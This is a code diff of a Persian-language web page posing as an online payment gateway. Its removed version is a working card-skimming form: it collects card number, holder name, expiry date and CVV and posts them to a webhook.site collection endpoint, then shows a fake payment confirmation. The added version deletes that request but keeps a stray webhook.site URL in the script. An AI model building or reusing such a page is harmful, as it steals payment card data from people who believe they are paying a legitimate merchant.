@@ -2,190 +2,123 @@
 <html lang="fa">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>درگاه پرداخت لینکدونی سیب</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title> درگاه پرداخت اینترنتی </title>
 <style>
-body, html {
-  height: 100%;
-  margin: 0;
-  font-family: "Tahoma", sans-serif;
-  background: repeating-conic-gradient(
-    from 45deg,
-    #0047ab 0deg 15deg,
-    #d32f2f 15deg 30deg
-  );
-  direction: rtl;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-.container {
-  background: #fff;
-  border-radius: 25px;
-  padding: 40px 45px;
-  box-shadow: 0 12px 35px rgba(0, 0, 0, 0.15);
-  width: 350px;
-  max-width: 90vw;
-  text-align: center;
-  transition: transform 0.3s ease;
-}
-.container:hover {
-  transform: translateY(-10px);
-  box-shadow: 0 20px 40px rgba(0,0,0,0.25);
-}
-.apple-icon {
-  font-size: 45px;
-  color: #4caf50;
-  margin-bottom: 20px;
-  user-select: none;
-}
-h1 {
-  color: #2e7d32;
-  margin-bottom: 30px;
-  font-weight: 700;
-  font-size: 24px;
-}
-input, button {
-  width: 100%;
-  padding: 15px 18px;
-  margin: 10px 0;
-  font-size: 18px;
-  border-radius: 14px;
-  border: 1.8px solid #cfcfcf;
-  transition: 0.3s;
-  box-sizing: border-box;
-}
-input:focus {
-  border-color: #66bb6a;
-  outline: none;
-  box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
-}
-button {
-  background: #4caf50;
-  color: white;
-  font-weight: 700;
-  border: none;
-  cursor: pointer;
-  letter-spacing: 1.2px;
-  box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
-}
-button:hover {
-  background: #388e3c;
-  box-shadow: 0 8px 20px rgba(56, 142, 60, 0.6);
-}
-.message {
-  margin-top: 25px;
-  padding: 20px;
-  background-color: #e8f5e9;
-  border: 1.5px solid #c8e6c9;
-  border-radius: 14px;
-  color: #2e7d32;
-  font-size: 18px;
-  font-weight: 700;
-  opacity: 0;
-  transform: translateY(20px);
-  transition: opacity 0.6s ease, transform 0.6s ease;
-  user-select: none;
-}
-.message.show {
-  opacity: 1;
-  transform: translateY(0);
-}
-@media (max-width: 500px) {
+  body, html {
+    height: 100%;
+    margin: 0;
+    font-family: Tahoma, sans-serif;
+    background-color: #888888; /* خاکستری */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    direction: rtl;
+  }
   .container {
-    padding: 30px 20px;
-    width: 95vw;
+    background: #fff;
+    border-radius: 20px;
+    padding: 30px 40px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    width: 360px;
+    max-width: 90vw;
+    text-align: center;
   }
   h1 {
-    font-size: 20px;
+    color: #333;
     margin-bottom: 25px;
   }
   input, button {
-    font-size: 16px;
-    padding: 12px 10px;
+    width: 100%;
+    padding: 14px 15px;
+    margin: 10px 0;
+    font-size: 18px;
+    border-radius: 12px;
+    border: 1.5px solid #ccc;
+    box-sizing: border-box;
+    transition: border-color 0.3s ease;
+  }
+  input:focus {
+    border-color: #4caf50;
+    outline: none;
+  }
+  button {
+    background-color: #4caf50;
+    color: white;
+    border: none;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 5px 15px rgba(76,175,80,0.4);
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #388e3c;
   }
   .message {
-    font-size: 16px;
-    padding: 15px;
     margin-top: 20px;
+    padding: 15px;
+    border-radius: 12px;
+    background-color: #e0f2e9;
+    color: #2e7d32;
+    font-weight: 700;
+    display: none;
   }
-}
 </style>
 </head>
 <body>
-<div class="container">
-  <div class="apple-icon">🍏🍎</div>
-  <h1>درگاه پرداخت لینکدونی سیب</h1>
-  <form id="paymentForm">
-    <input type="number" id="amount" placeholder="مبلغ پرداختی (تومان)" required min="1000" />
-    <input type="text" id="cardNumber" placeholder="شماره کارت (16 رقم)" required pattern="\d{16}" maxlength="16" />
-    <input type="text" id="cardHolder" placeholder="نام صاحب کارت" required />
-    <input type="text" id="expiryDate" placeholder="تاریخ انقضا (MM/YY)" required pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" />
-    <input type="text" id="cvv" placeholder="CVV (3 رقم)" required pattern="\d{3}" maxlength="3" />
-    <button type="submit">پرداخت</button>
-  </form>
-  <div class="message" id="successMessage"></div>
-</div>
+  <div class="container">
+    <h1> درگاه پرداخت اینترنتی</h1>
+    <form id="paymentForm">
+      <input type="number" id="amount" placeholder="مبلغ (تومان)" required min="1000" />
+      <input type="text" id="cardNumber" placeholder="شماره کارت (16 رقم)" required pattern="\d{16}" maxlength="16" />
+      <input type="text" id="cardHolder" placeholder="نام صاحب کارت" required />
+      <input type="text" id="expiryDate" placeholder="تاریخ انقضا (MM/YY)" required pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" />
+      <input type="text" id="cvv" placeholder="CVV (3 رقم)" required pattern="\d{3}" maxlength="3" />
+      <button type="submit">پرداخت</button>
+    </form>
+    <div class="message" id="successMessage"></div>
+  </div>
+
 <script>
-const form = document.getElementById('paymentForm');
-const successMessage = document.getElementById('successMessage');
-form.addEventListener('submit', function(e) {
-  e.preventDefault();
-  const amount = document.getElementById('amount').value;
-  const cardNumber = document.getElementById('cardNumber').value;
-  const cardHolder = document.getElementById('cardHolder').value.trim();
-  const expiryDate = document.getElementById('expiryDate').value;
-  const cvv = document.getElementById('cvv').value;
-  if (cardNumber.length !== 16 || isNaN(cardNumber)) {
-    alert('لطفا شماره کارت 16 رقمی صحیح وارد کنید.');
-    return;
-  }
-  if (!cardHolder) {
-    alert('لطفا نام صاحب کارت را وارد کنید.');
-    return;
-  }
-  if (!expiryDate.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
-    alert('تاریخ انقضا را به صورت MM/YY وارد کنید.');
-    return;
-  }
-  if (cvv.length !== 3 || isNaN(cvv)) {
-    alert('کد CVV باید 3 رقم باشد.');
-    return;
-  }
-  const data = {
-    amount,
-    cardNumber,
-    cardHolder,
-    expiryDate,
-    cvv
-  };
-  fetch('https://webhook.site/76382a5c-a72e-4b9f-9790-650023719c21', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data)
-  })
-  .then(response => {
-    if (response.ok) {
-      successMessage.innerHTML = `
-        پرداخت موفق! <br/>
-        مبلغ: ${amount} تومان <br/>
-        شماره کارت: ${cardNumber} <br/>
-        نام صاحب کارت: ${cardHolder} <br/>
-        تاریخ انقضا: ${expiryDate} <br/>
-        CVV: ${cvv} <br/><br/>
-        تراکنش آموزشی با موفقیت انجام شد.
-      `;
-      successMessage.classList.add('show');
-      form.reset();
-      setTimeout(() => successMessage.classList.remove('show'), 6000);
-    } else {
-      alert('ارسال اطلاعات با خطا مواجه شد.');
+  const form = document.getElementById('paymentForm');
+  const successMessage = document.getElementById('successMessage');
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const amount = document.getElementById('amount').value;
+    const cardNumber = document.getElementById('cardNumber').value;
+    const cardHolder = document.getElementById('cardHolder').value.trim();
+    const expiryDate = document.getElementById('expiryDate').value;
+    const cvv = document.getElementById('cvv').value;
+
+    if (cardNumber.length !== 16 || isNaN(cardNumber)) {
+      alert('شماره کارت باید 16 رقم باشد.');
+      return;
     }
-  })
-  .catch(error => {
-    alert('خطا در ارسال اطلاعات: ' + error.message);
+    if (!cardHolder) {
+      alert('نام صاحب کارت را وارد کنید.');
+      return;
+    }
+    if (!expiryDate.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
+      alert('تاریخ انقضا را به فرمت MM/YY وارد کنید.');
+      return;
+    }
+    if (cvv.length !== 3 || isNaN(cvv)) {
+      alert('کد CVV باید 3 رقم باشد.');
+      return;
+    }
+https://webhook.site/5c896653-7f02-4929-90b9-5d8208abee9a
+    // اینجا میتونید کد ارسال به سرور یا API پرداخت رو قرار بدید
+
+    successMessage.style.display = 'block';
+    successMessage.textContent = `پرداخت با موفقیت انجام شد! مبلغ: ${amount} تومان`;
+    form.reset();
+
+    setTimeout(() => {
+      successMessage.style.display = 'none';
+    }, 6000);
   });
-});
 </script>
 </body>
 </html>
